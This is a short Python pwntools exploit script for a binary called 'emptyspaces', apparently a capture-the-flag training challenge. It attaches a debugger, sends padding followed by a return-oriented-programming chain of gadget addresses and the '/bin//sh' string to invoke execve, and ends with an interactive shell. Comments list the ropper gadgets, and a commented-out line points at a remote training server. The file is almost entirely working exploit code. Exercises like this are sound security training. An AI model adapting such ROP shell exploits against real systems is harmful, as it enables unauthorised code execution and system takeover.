#!/usr/bin/python
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

r = process("./emptyspaces")
gdb.attach(r, """
	b *0x00400c14
	c
	""")
#r = remote("training.jinblack.it", 4006)
input("wait")

code =  b"aaaaaaabcaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa"  + p64(0x410133) +p64(0x68732f2f6e69622f) + p64(0x4a66c6) + p64(0x4155a4) + p64(0x3b)+ p64(0x44400d) 

#send first part and pop rdi
r.send(code)



r.interactive()

#ropper --file emptyspaces --search "pop rax"

#0x0000000000410133: pop rsi; ret; 

#0x000000000044bd36: pop rdx; ret; 

#0x00000000004155a4: pop rax; ret; 

#0x000000000044400d: pop rdi; syscall; 

#0x00000000004a66c6: push rsi; ret; 

